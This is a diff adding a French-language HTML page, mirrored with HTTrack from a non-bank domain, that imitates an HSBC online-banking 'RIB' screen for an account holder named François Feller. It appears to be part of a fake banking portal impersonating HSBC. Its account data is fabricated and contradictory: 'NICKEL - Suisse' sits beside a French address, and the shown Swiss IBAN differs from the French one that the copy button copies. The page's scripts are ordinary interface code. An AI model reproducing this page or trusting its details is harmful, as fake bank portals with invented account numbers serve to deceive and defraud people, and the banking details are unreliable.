@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<!-- Mirrored from e-econnexion.online/1dfbc1HSBCf3eacf/rib.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Dec 2025 17:51:12 GMT -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NICKEL - RIB - Identité Bancaire</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="assets/css/modern-hsbc.css">
+  <script src="../../cdn.jsdelivr.net/npm/chart.js"></script>
+  <script type="module" src="../../unpkg.com/ionicons%405.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="../../unpkg.com/ionicons%405.5.2/dist/ionicons/ionicons.js"></script>
+  <style>
+:root {
+ --primary-color: #db0011;       /* Rouge principal HSBC */
+ --secondary-color: #a5000d;     /* Rouge foncé HSBC */
+ --accent-color: #ff1428;        /* Rouge vif pour les accents */
+ --success-color: #2ecc71;       /* Vert pour validations */
+ --danger-color: #e74c3c;        /* Rouge vif pour alertes */
+ --background-color: #f4f6f7;    /* Gris très clair pour le fond */
+ --card-background: #ffffff;     /* Blanc pur */
+ --text-primary: #2c3e50;        /* Bleu-gris foncé pour le texte */
+ --text-secondary: #7f8c8d;      /* Gris doux pour le texte secondaire */
+ --border-color: #bdc3c7;        /* Gris neutre pour les bordures */
+ --hover-color: #a5000d;         /* Rouge foncé pour hover */
+ --gradient-start: #db0011;      /* Début du dégradé rouge */
+ --gradient-end: #a5000d;        /* Fin du dégradé rouge */
+}
+
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+}
+
+body {
+  background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+  padding-bottom: 70px;
+  position: relative;
+}
+
+body::before {
+  content: '';
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: 
+    radial-gradient(circle at 20% 80%, rgba(219, 0, 17, 0.05) 0%, transparent 50%),
+    radial-gradient(circle at 80% 20%, rgba(165, 0, 13, 0.05) 0%, transparent 50%);
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* Header */
+.header {
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(20px);
+  padding: 1.5rem 2rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+  border-bottom: 1px solid rgba(219, 0, 17, 0.1);
+  position: relative;
+  z-index: 10;
+}
+
+.header-title {
+  display: flex;
+  align-items: center;
+}
+
+.bank-logo {
+  height: 45px;
+  width: auto;
+  filter: drop-shadow(0 2px 8px rgba(219, 0, 17, 0.2));
+  transition: all 0.3s ease;
+}
+
+.bank-logo:hover {
+  transform: scale(1.05);
+  filter: drop-shadow(0 4px 12px rgba(219, 0, 17, 0.3));
+}
+
+.logout-btn {
+  background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+  color: white;
+  border: none;
+  padding: 0.75rem 1.5rem;
+  border-radius: 12px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-weight: 600;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  box-shadow: 0 4px 12px rgba(219, 0, 17, 0.2);
+  position: relative;
+  overflow: hidden;
+}
+
+.logout-btn::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+  transition: left 0.5s;
+}
+
+.logout-btn:hover::before {
+  left: 100%;
+}
+
+.logout-btn:hover {
+  background: linear-gradient(135deg, var(--accent-color) 0%, var(--primary-color) 100%);
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(219, 0, 17, 0.3);
+}
+
+/* Welcome Section */
+.welcome {
+  background: linear-gradient(135deg, var(--gradient-start), var(--gradient-end));
+  color: white;
+  padding: 1.5rem;
+  text-align: center;
+  margin: 1.5rem auto;
+  max-width: 1200px;
+  border-radius: 1rem;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+}
+
+/* RIB Container */
+.container {
+  max-width: 800px;
+  margin: 1.5rem auto;
+  background: var(--card-background);
+  border-radius: 1rem;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  overflow: hidden;
+  transition: transform 0.3s ease;
+}
+
+.container:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+}
+
+.rib_title {
+  background-color: var(--primary-color);
+  color: white;
+  padding: 1.25rem;
+  margin: 0;
+}
+
+.rib_title h3 {
+  margin: 0;
+  font-size: 1.25rem;
+  font-weight: 600;
+}
+
+.rib_content {
+  padding: 1.5rem;
+  background: white;
+}
+
+.rib_part {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 1rem;
+  border-bottom: 1px solid var(--border-color);
+  transition: background-color 0.3s ease;
+}
+
+.rib_part:hover {
+  background-color: rgba(0, 70, 135, 0.05);
+}
+
+.rib_part:last-child {
+  border-bottom: none;
+}
+
+.rib_label {
+  color: var(--text-secondary);
+  font-weight: 500;
+  margin: 0;
+}
+
+.rib_value {
+  color: var(--text-primary);
+  font-weight: 600;
+  margin: 0;
+  font-family: 'Courier New', monospace;
+}
+
+/* IBAN Section */
+.iban-section .rib_value {
+  letter-spacing: 1px;
+  font-size: 1.1rem;
+}
+
+/* Navigation */
+.navigation_bar {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: white;
+  box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+  z-index: 1000;
+}
+
+.navigation {
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+.navigation ul {
+  display: flex;
+  justify-content: space-around;
+  list-style: none;
+  padding: 0.75rem 0;
+  margin: 0;
+  position: relative;
+}
+
+.navigation .list {
+  position: relative;
+  width: 70px;
+  z-index: 1;
+}
+
+.navigation .list a {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-decoration: none;
+  color: var(--text-secondary);
+  transition: color 0.3s;
+}
+
+.navigation .list.active a {
+  color: var(--primary-color);
+}
+
+.navigation .icon {
+  font-size: 1.5rem;
+  margin-bottom: 4px;
+}
+
+.navigation .text {
+  font-size: 0.75rem;
+}
+
+.indicator {
+  position: absolute;
+  bottom: -10px;
+  width: 70px;
+  height: 70px;
+  background: var(--primary-color);
+  border-radius: 50%;
+  transition: 0.5s;
+  opacity: 0;
+}
+
+.navigation .list.active ~ .indicator {
+  opacity: 0.2;
+}
+
+/* Media Queries */
+/* Améliorations RIB */
+.title-with-flag {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+
+.flag-france {
+  color: #0055A4;
+}
+
+.flag-maroc {
+  color: #C1272D;
+}
+
+.account-type {
+  background: rgba(255, 255, 255, 0.2);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  font-size: 0.8rem;
+  font-weight: 500;
+}
+
+.account-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 1.5rem 0;
+  border-bottom: 2px solid var(--border-color);
+  margin-bottom: 1.5rem;
+}
+
+.account-info h4 {
+  color: var(--primary-color);
+  font-size: 1.3rem;
+  margin: 0 0 0.25rem 0;
+}
+
+.account-info p {
+  color: var(--text-secondary);
+  margin: 0;
+  font-size: 0.9rem;
+}
+
+.bank-logo-small {
+  background: var(--primary-color);
+  color: white;
+  padding: 0.5rem 1rem;
+  border-radius: 0.5rem;
+  font-weight: 700;
+  font-size: 0.9rem;
+}
+
+.rib-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+}
+
+.rib_part {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  padding: 1rem;
+  background: rgba(0, 70, 135, 0.02);
+  border-radius: 0.75rem;
+  border: 1px solid rgba(0, 70, 135, 0.1);
+  transition: all 0.3s ease;
+}
+
+.rib_part:hover {
+  background: rgba(0, 70, 135, 0.05);
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+}
+
+.rib-icon {
+  width: 40px;
+  height: 40px;
+  background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 1.1rem;
+  flex-shrink: 0;
+}
+
+.rib-info {
+  flex: 1;
+}
+
+.rib-info .rib_label {
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+  margin: 0 0 0.25rem 0;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.rib-info .rib_value {
+  font-size: 1rem;
+  color: var(--text-primary);
+  font-weight: 600;
+  margin: 0;
+}
+
+.domiciliation {
+  display: flex;
+  gap: 1rem;
+  align-items: flex-start;
+  padding: 1.5rem;
+  background: linear-gradient(135deg, rgba(219, 0, 17, 0.05), rgba(165, 0, 13, 0.05));
+  border-radius: 0.75rem;
+  border-left: 4px solid var(--primary-color);
+}
+
+.domiciliation i {
+  color: var(--primary-color);
+  font-size: 1.2rem;
+  margin-top: 0.25rem;
+}
+
+.address {
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+  margin: 0.25rem 0 0 0;
+  font-style: italic;
+}
+
+.international-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+
+.iban-section {
+  background: linear-gradient(135deg, rgba(46, 204, 113, 0.05), rgba(39, 174, 96, 0.05));
+  border-left: 4px solid #2ecc71;
+}
+
+.iban-highlight {
+  font-size: 1.2rem !important;
+  letter-spacing: 1px;
+  color: #27ae60 !important;
+  font-family: 'Courier New', monospace;
+}
+
+.copy-btn {
+  background: #2ecc71;
+  color: white;
+  border: none;
+  padding: 0.5rem 1rem;
+  border-radius: 0.5rem;
+  font-size: 0.8rem;
+  cursor: pointer;
+  margin-top: 0.5rem;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.copy-btn:hover {
+  background: #27ae60;
+  transform: translateY(-1px);
+}
+
+.swift-desc {
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+  margin: 0.25rem 0 0 0;
+  font-style: italic;
+}
+
+.international-section {
+  margin-top: 1.5rem;
+  padding-top: 1.5rem;
+  border-top: 2px solid var(--border-color);
+}
+
+/* Couleurs spécifiques par pays */
+.rib-france .rib_title {
+  background: linear-gradient(135deg, #0055A4, #EF4135);
+}
+
+.rib-maroc .rib_title {
+  background: linear-gradient(135deg, #C1272D, #006233);
+}
+
+.rib-international .rib_title {
+  background: linear-gradient(135deg, #2c3e50, #3498db);
+}
+
+@media (max-width: 768px) {
+  .container {
+    margin: 1rem;
+  }
+
+  .rib_value {
+    font-size: 0.9rem;
+  }
+
+  .welcome {
+    margin: 1rem;
+  }
+
+  .rib_title {
+    padding: 1rem;
+  }
+
+  .rib_content {
+    padding: 1rem;
+  }
+
+  .rib_part {
+    padding: 0.875rem;
+  }
+
+  .rib-grid {
+    grid-template-columns: 1fr;
+  }
+
+  .account-header {
+    flex-direction: column;
+    gap: 1rem;
+    text-align: center;
+  }
+
+  .domiciliation {
+    flex-direction: column;
+    gap: 0.75rem;
+  }
+
+  .iban-highlight {
+    font-size: 1rem !important;
+  }
+}
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="header-title">
+      <img src="assets/images/logo.png" alt="HSBC France Logo" class="bank-logo">
+    </div>
+    <div class="user-menu">
+      <button class="logout-btn" onclick="deconnexion()">
+        <i class="fas fa-sign-out-alt"></i>
+        Déconnexion
+      </button>
+    </div>
+</header>
+
+  <div id="google_translate_element"></div>
+
+  <div class="welcome">
+    <h4>Relevé d'identité bancaire</h4>
+  </div>
+
+<!-- RIB France -->
+<div class="container rib-france">
+    <div class="rib_title">
+        <div class="title-with-flag">
+            <i class="fas fa-flag flag-france"></i>
+            <h3>RIB France - Relevé d'Identité Bancaire</h3>
+        </div>
+        <div class="account-type">Compte Principal</div>
+    </div>
+    <div class="rib_content">
+        <div class="account-header">
+            <div class="account-info">
+                <h4>FRANÇOIS FELLER</h4>
+                <p>Titulaire du compte</p>
+            </div>
+            <div class="bank-logo-small">
+                <span>HSBC</span>
+            </div>
+        </div>
+        
+        <div class="rib-grid">
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-university"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Code Banque</p>
+                    <p class="rib_value">40031</p>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-building"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Code Agence</p>
+                    <p class="rib_value">00001</p>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-credit-card"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Numéro de Compte</p>
+                    <p class="rib_value">00001222844</p>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-key"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Clé RIB</p>
+                    <p class="rib_value">84</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="domiciliation">
+            <i class="fas fa-map-marker-alt"></i>
+            <div>
+                <p class="rib_label">Domiciliation</p>
+                <p class="rib_value">NICKEL - Suisse</p>
+                <p class="address">1 Place des Marseillais, 94220 Charenton-le-Pont, France</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- RIB International -->
+<div class="container rib-international">
+    <div class="rib_title">
+        <div class="title-with-flag">
+            <i class="fas fa-globe"></i>
+            <h3>Coordonnées Bancaires Internationales</h3>
+        </div>
+        <div class="account-type">Virements SEPA & International</div>
+    </div>
+    <div class="rib_content">
+        <div class="international-grid">
+            <div class="rib_part iban-section">
+                <div class="rib-icon">
+                    <i class="fas fa-passport"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">IBAN (International Bank Account Number)</p>
+                    <p class="rib_value iban-highlight">CH14 4003 1000 0100 0012 2284 84</p>
+                    <button class="copy-btn" onclick="copyToClipboard('FR144003100001000012228484')">
+                        <i class="fas fa-copy"></i> Copier
+                    </button>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Code SWIFT (BIC)</p>
+                    <p class="rib_value">CCCHCHPP</p>
+                    <p class="swift-desc">NICKEL SUISSE - Code international</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- RIB Maroc -->
+<!--div class="container rib-maroc">
+    <div class="rib_title">
+        <div class="title-with-flag">
+            <i class="fas fa-flag flag-maroc"></i>
+            <h3>RIB Maroc - Relevé d'Identité Bancaire</h3>
+        </div>
+        <div class="account-type">Compte Secondaire</div>
+    </div>
+    <div class="rib_content">
+        <div class="account-header">
+            <div class="account-info">
+                <h4>FRANÇOIS FELLER</h4>
+                <p>Titulaire du compte</p>
+            </div>
+            <div class="bank-logo-small">
+                <span>HSBC</span>
+            </div>
+        </div>
+        
+        <div class="rib-grid">
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-university"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Code Banque</p>
+                    <p class="rib_value">007</p>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-building"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Code Agence</p>
+                    <p class="rib_value">240</p>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-credit-card"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Numéro de Compte</p>
+                    <p class="rib_value">007240000012345678</p>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-key"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Clé RIB</p>
+                    <p class="rib_value">21</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="international-section">
+            <div class="rib_part iban-section">
+                <div class="rib-icon">
+                    <i class="fas fa-passport"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">IBAN Maroc</p>
+                    <p class="rib_value iban-highlight">MA64 0072 4000 0012 3456 7821</p>
+                    <button class="copy-btn" onclick="copyToClipboard('MA6400724000001234567821')">
+                        <i class="fas fa-copy"></i> Copier
+                    </button>
+                </div>
+            </div>
+            <div class="rib_part">
+                <div class="rib-icon">
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+                <div class="rib-info">
+                    <p class="rib_label">Code SWIFT (BIC)</p>
+                    <p class="rib_value">BBMAMAMC</p>
+                    <p class="swift-desc">HSBC Maroc - Casablanca</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="domiciliation">
+            <i class="fas fa-map-marker-alt"></i>
+            <div>
+                <p class="rib_label">Domiciliation</p>
+                <p class="rib_value">HSBC MAROC - Casablanca Centre</p>
+                <p class="address">25 Boulevard Rachidi, Casablanca 20100, Maroc</p>
+            </div>
+        </div>
+    </div>
+</div-->
+
+
+    <!-- Menu de navigation -->
+    <nav class="nav-menu">
+        <a href="solde.html" class="nav-item">
+            <i class="fas fa-chart-line"></i>
+            <span>Comptes</span>
+        </a>
+        <a href="virement.html" class="nav-item">
+            <i class="fas fa-exchange-alt"></i>
+            <span>Virements</span>
+        </a>
+        <a href="historique.html" class="nav-item">
+            <i class="fas fa-history"></i>
+            <span>Historique</span>
+        </a>
+        <a href="cartes.html" class="nav-item">
+            <i class="fas fa-credit-card"></i>
+            <span>Cartes</span>
+        </a>
+        <a href="rib.html" class="nav-item active">
+            <i class="fas fa-file-alt"></i>
+            <span>RIB</span>
+        </a>
+    </nav>
+
+  <script>
+    // Navigation
+    const list = document.querySelectorAll(".list");
+    function activeLink() {
+      list.forEach((item) => item.classList.remove("active"));
+      this.classList.add("active");
+    }
+    list.forEach((item) => item.addEventListener("click", activeLink));
+
+    
+  </script>
+  <script>
+    function deconnexion() {
+        if(confirm("Êtes-vous sûr de vouloir vous déconnecter ?")) {
+            window.location.href = 'connexion.html';
+        }
+    }
+
+    // Fonction pour copier l'IBAN dans le presse-papiers
+    function copyToClipboard(text) {
+        navigator.clipboard.writeText(text).then(function() {
+            // Animation de succès
+            const event = new CustomEvent('showToast', {
+                detail: {
+                    message: 'IBAN copié dans le presse-papiers !',
+                    type: 'success'
+                }
+            });
+            document.dispatchEvent(event);
+            
+            // Fallback pour les navigateurs qui ne supportent pas les toasts
+            setTimeout(() => {
+                alert('IBAN copié dans le presse-papiers !');
+            }, 100);
+        }).catch(function(err) {
+            console.error('Erreur lors de la copie: ', err);
+            // Fallback pour anciens navigateurs
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert('IBAN copié dans le presse-papiers !');
+        });
+    }
+
+    // Animation d'entrée pour les cartes RIB
+    document.addEventListener('DOMContentLoaded', function() {
+        const containers = document.querySelectorAll('.container');
+        containers.forEach((container, index) => {
+            container.style.opacity = '0';
+            container.style.transform = 'translateY(30px)';
+            
+            setTimeout(() => {
+                container.style.transition = 'all 0.6s ease';
+                container.style.opacity = '1';
+                container.style.transform = 'translateY(0)';
+            }, index * 200);
+        });
+    });
+</script>
+
+</body>
+
+<!-- Mirrored from e-econnexion.online/1dfbc1HSBCf3eacf/rib.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Dec 2025 17:51:12 GMT -->
+</html>
